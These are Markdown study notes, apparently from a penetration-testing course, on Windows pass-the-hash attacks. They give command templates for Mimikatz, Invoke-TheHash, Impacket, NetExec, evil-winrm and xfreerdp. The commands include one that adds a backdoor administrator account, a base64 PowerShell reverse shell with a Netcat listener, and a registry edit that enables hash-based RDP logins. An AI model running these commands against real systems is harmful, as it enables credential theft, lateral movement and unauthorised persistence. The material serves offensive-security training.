- A pass the Hash attack is a technique where an attacker uses a password hash instead of the plain text password for authentication.
- The attacker must have administrative privileges or particular privileges on the target machine to obtain a password Hash:
	- `Dumping the local SAM database from a compromised host`
	- `Extracting hashes from the NTDS database (ntds.dit) on the Domain Controller.`
	- `Pulling the hashes from memory (lsass.exe)`.

## Introduction to Windows NTLM:

-  Microsoft's Windows ==`New Technology LAN Manager`== is a set of security protocol that authenticates the user's identities while also protecting the integrity and confidentiality of their data. 
- NTLM is a single sign-on (SSO) solution that uses a challenge-response protocol to verify the user's identity without having them provide a password.
- Microsoft continues to support NTLM, Kerberos has taken over as the default authentication mechanism in Windows 2000 and subsequent Active Directory (AD) domains.
- With NTLM, password stored in server and domain controller are not `"salted"` which can lead to the pass the hash attack.

## Pass the Hash with Mimikatz(Windows):

- Use the module ==`sekurlsa::pth`== that allow to perform a ==`Pass The Hash`== attack by starting a process using the hash of the user's password, get familiar with:
	
	- `/user`: Holds the username that attackers want to impersonate.
	
	- `/rc4` or `/NTLM`: NATLM hash of the user's password.
	
	- `/domain`: Domain the user to impersonate belongs to, In case of the computer name:
		- `localhost`
		- or  a `dot(.)`
	
	- `/run`: The program that attacker want to run with user's context.

	- ### Pass the Hash from Windows Using Mimikatz:
		
		- `Command:`
			- `mimikatz.exe privilege::debug "sekurlsa::pth /user:`<user_name>` /rc4:`<hash_value>` /domain:"<domain_name>" /run:<platform_to_run>" exit`

## Pass the Hash with PowerShell Invoke-TheHash(Windows)

- Another tool that can be used to perform Pass the Hash attacks on Windows is ==`Invoke-TheHash`==.
- This also needs a administrative rights on the target system.
- Using this option, there are 2 options for executions:
	- `WMI` 
	- `SMB`
- In order to use this tool, there are some parameter that need to specify:
	- `Target`: Hostname or the Ip add
	- `Username`: Username to use for authentication
	- `Domain`: Domain to use for authentication. 
	- `Hash`: NTLM password hash for authentication
	- `Command`: Command to execute on the target
- Command:
	- This command will use the SMB method for command Execution to create a new user named mark and add the user to the Administrative group:
		
		- ### Invoke-TheHash with SMB:
			
			- `cd C:\tools\Invoke-TheHash`
			- `Import-Module .\Invoke-TheHash.psd1`
			- `Invoke-SMBExec -Target <target_add> -Domain <Domain_name>-Username <username> -Hash <hash_value> -Command <"net user mark Password123 /add && net localgroup administrators mark /add"> -Verbose`
		
		- ### Invoke-TheHash with WMI:
			
			- Get a reverse shell connection in the target machine.
			- To get a reverse shell, start a listener using Netcat on the attacker machine, which has the Ip address.
			- To create a simple reverse shell using PowerShell, visit  [revshells.com](https://www.revshells.com/) and set all the parameter and select ==`PowerShell #3 (Base64)`== 
			- `Command`:
				- `Import-Module .\Invoke-TheHash.psd1`
				- `Invoke-WMIExec -Target <targets_sysname> -Username <user_name> -Hash <hash_value> -Command "<Base64_encrypted_command_from_revshells.com>"`
			
			- This will result a reverse shell connection.

## Pass the Hash with Impacket(Linux):

- Impacket has several tools that can be use for different operations such as Command Execution and Credential Dumping, Enumeration etc. 

- ### Pass the Hash with Impacket PsExec:
	
	- `impacket-psexec <user_name>@<target_add> -hashes:<hash_value>`

- There are several other tool in the Impacket toolkit  that can be used for command execution using Pass the Hash:
	
	- impacket-wmiexec
	- impacket-atexec
	- impacket-smbexec

## Pass the Hash with NetExec(Linux):

- NetExec is a post-exploitation tool that helps to automate assessing the security of large Active Directory networks.
- NetExec can be used to authenticate to some or all host in a network.
- This method can lock out domain accounts, so keep the target domain's account lockout policy in mind and make sure to use the local account method,  
- Command:
	- `netexec smb <target_add> -u <user_name> -d . -H <hash_value>`

## Pass the Hash with evil-winrm (Linux):

- Evil-winrm is another tool that can be use to authenticate using the Pass the Hash attack with PowerShell remoting.
- If SMB is blocked or don't have administrative rights then use alternative protocol to connect to the target.
- `Command`:
	- `evil-winrm -i <target_add> -u <user_name> -H <hash_value>`

## Pass the Hash with RDP(Linux):

- We can perform an RDP attack to gain GUI access to the target system using tools like ==`xfreerdp`==. 
- There are a few caveats to this attack:
	
	- ==`Restricted Admin Mode`==: This is disabled by default, This can be enabled by adding new registry key ==`DisableRestrictedAdmin`== (REG_DWORD) under `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa` with the value of 0.
	- It can be done using the Command:
		- `reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f`

	- #### Pass the Hash Using RDP:
		
		- `xfreerdp /v:<ip_add> /u:<user_name> /pth:<password_hash>`

## UAC limits Pass The Hash for Local Accounts:

- UAC (User Account Control) limits local users' ability to perform remote administration operations.
- When Registry key `{HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy}`  is set to 0, it means that the built-in local admin accounts (RID-500,"Administrator") is the only local account allowed to perform remote administration tasks.
- When its 1 then it allows other local admins as well.
- 